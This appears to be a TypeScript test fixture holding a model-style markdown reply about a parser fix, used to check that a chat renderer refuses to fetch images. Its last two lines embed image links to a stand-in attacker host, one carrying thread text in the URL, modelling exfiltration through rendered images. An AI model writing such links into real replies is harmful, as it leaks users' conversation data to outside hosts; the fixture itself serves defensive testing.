/** What the person asks for a reply in markdown (`streamReply`). */
export const MARKDOWN_PROMPT = 'What changed?';

/**
 * A reply in markdown as a model writes it: a heading, a table, a task list, code, a link, and
 * two images that must never be fetched, one written in markdown and one in raw HTML.
 */
export const MARKDOWN_REPLY = [
  '## The parser is fixed',
  '',
  '`parse()` returned a value for **empty input** and unwrapped a failed parse; it now returns ' +
    '`None` for both. See [the issue](https://github.com/glave-ai/glave/issues/226).',
  '',
  '| Input | Before | After |',
  '| :---- | :----: | ----: |',
  '| `""` | panic | `None` |',
  '| `"12"` | `12` | `Some(12)` |',
  '',
  '- [x] Return `None` for empty input',
  '- [ ] Document the change',
  '',
  '```rust',
  'fn parse(input: &str) -> Option<Value> {',
  '    if input.is_empty() {',
  '        return None;',
  '    }',
  '    input.parse().ok()',
  '}',
  '```',
  '',
  '![Coverage by file](https://evil.example/chart.png?thread=make-the-tests-pass)',
  '',
  '<img src="https://evil.example/pixel.png">',
].join('\n');
